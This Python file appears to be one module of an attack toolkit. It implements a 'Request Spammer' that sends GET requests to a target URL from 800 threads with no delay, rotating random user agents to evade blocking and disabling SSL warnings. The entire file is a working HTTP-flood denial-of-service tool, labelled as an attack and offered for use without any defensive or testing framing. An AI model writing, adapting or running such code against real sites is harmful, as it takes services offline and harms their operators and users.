#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Request Spammer Attack
Architect 01 - Professional Suite
"""

import requests
import threading
import time
import random
from colorama import Fore, Style
from core.utils.useragents import get_random_ua

class RequestSpammer:
    """Simple request spammer - high volume requests"""
    
    def __init__(self, target_url, threads=800):
        self.target_url = target_url
        self.threads = threads
        self.running = True
        self.request_count = 0
        self.error_count = 0
        
    def spam_worker(self):
        """Worker thread - just spam requests as fast as possible"""
        session = requests.Session()
        
        while self.running:
            try:
                ua = get_random_ua()
                headers = {'User-Agent': ua}
                
                # Send request - no delay, as fast as possible
                response = session.get(self.target_url, headers=headers, timeout=5)
                
                self.request_count += 1
                
                if self.request_count % 1000 == 0:
                    print(f"{Fore.GREEN}   ╰─❯ [{threading.current_thread().name}] Total spam: {self.request_count}{Style.RESET_ALL}")
                    
            except Exception:
                self.error_count += 1
                # Recreate session on error
                session = requests.Session()
    
    def start(self):
        """Start the spam attack"""
        print(f"{Fore.YELLOW}\n   ╰─❯ Starting Request Spam on {self.target_url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   ╰─❯ Threads: {self.threads}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   ╰─❯ Mode: MAXIMUM SPAM (no delay){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   ╰─❯ Press Ctrl+C to stop\n{Style.RESET_ALL}")
        
        # Disable SSL warnings
        requests.packages.urllib3.disable_warnings()
        
        # Start worker threads
        for i in range(self.threads):
            worker = threading.Thread(target=self.spam_worker, name=f"Spammer-{i+1}")
            worker.daemon = True
            worker.start()
        
        # Monitor progress
        try:
            start_time = time.time()
            last_count = 0
            
            while self.running:
                time.sleep(3)
                elapsed = time.time() - start_time
                new_requests = self.request_count - last_count
                rps = new_requests / 3
                last_count = self.request_count
                
                print(f"{Fore.CYAN}   ╰─❯ Total: {self.request_count} | RPS: {rps:.1f} | Errors: {self.error_count}{Style.RESET_ALL}")
                
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Stop the attack"""
        self.running = False
        print(f"{Fore.RED}\n   ╰─❯ Stopping Request Spam...{Style.RESET_ALL}")
        print(f"{Fore.RED}   ╰─❯ Total requests sent: {self.request_count}{Style.RESET_ALL}")
        print(f"{Fore.RED}   ╰─❯ Total errors: {self.error_count}{Style.RESET_ALL}")
